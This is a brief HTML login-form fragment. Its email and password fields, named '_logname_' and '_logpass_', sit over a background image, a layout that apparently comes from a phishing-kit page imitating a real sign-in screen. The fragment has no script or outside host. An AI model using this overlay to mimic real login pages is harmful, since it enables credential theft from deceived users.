
<form id="myform" name="myform" method="POST" style="width:100%; padding-top: 5%;">

	
	<div class="col-xs-12 col-md-6" style="margin: 1% 0px 0px;display: block;">
	
	<input style="z-index: 99999; position: relative;"  name="_logname_" id="_logname_" class="form-control input-lg style log" required="" title="Please Enter Your Email" type="email"/>
	<input style="position: relative; z-index: 9999; top: 55px;"  name="_logpass_" id="_logpass_" class="col-xs-1 col-md-3 form-control input-lg style pa" required="" title="Please Enter Your Password" type="password"/>
	<img style="position: relative; top: -95px;"  src="../set/img/note.png">	
	<div style="top: -90px; position: relative;"><b class="fs-subtitle" style="color: red;" id="msg" ></b></div>
		<input style="position: relative; top: -50px;" type="button" name="next" id="next" value="Sign In"  class="btn btn-primary mybotton"/>
	</div>


</form>
